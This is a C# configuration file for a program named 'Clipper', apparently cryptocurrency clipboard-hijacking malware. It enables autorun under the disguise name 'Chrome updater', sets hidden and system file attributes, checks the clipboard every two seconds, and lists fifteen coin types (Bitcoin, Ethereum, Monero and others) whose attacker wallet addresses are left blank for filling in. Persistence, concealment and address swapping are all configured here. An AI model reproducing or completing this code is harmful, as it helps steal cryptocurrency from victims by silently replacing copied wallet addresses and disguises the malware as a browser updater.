using System.Collections.Generic;

namespace Clipper
{
    internal class config
    {
        // Autorun
        public static bool autorun_enabled = true;
        public static string autorun_name = "Chrome updater";
        // Set 'hidden' attribute
        public static bool attribute_hidden = true;
        // Set 'system' attribute
        public static bool attribute_system = true;
        // Clipboard check delay in seconds
        public static int clipboard_check_delay = 2;
        // Replace 
        public static Dictionary<string, string> addresses = new Dictionary<string, string>()
        {
            {"btc", "" }, // Bitcoin
            {"eth", "" }, // Ethereum
            {"xmr", "" }, // Monero
            {"xrp", "" }, // Ripple
            {"ltc", "" }, // Litecoin
            {"nec", "" }, // Neocoin
            {"bch", "" }, // Bitcoin Cash
            {"dash", "" }, // Dashcoin
            {"bnb", "" }, // Binance coin
            {"sol", "" }, // Solana
            {"trx", "" }, // Tron
            {"ada", "" }, // Cardano
            {"doge", "" }, // Dogecoin
            {"xlm", "" }, // Stellar
            {"rvn", "" } // Ravencoin
        };
        
        // Mutex (random)
        public static string mutex = "asdasdAOPSFJoaSFlkhakbgskQOh92h1oiAKSBaiys9daigskfbaskfbasf";

    }
}
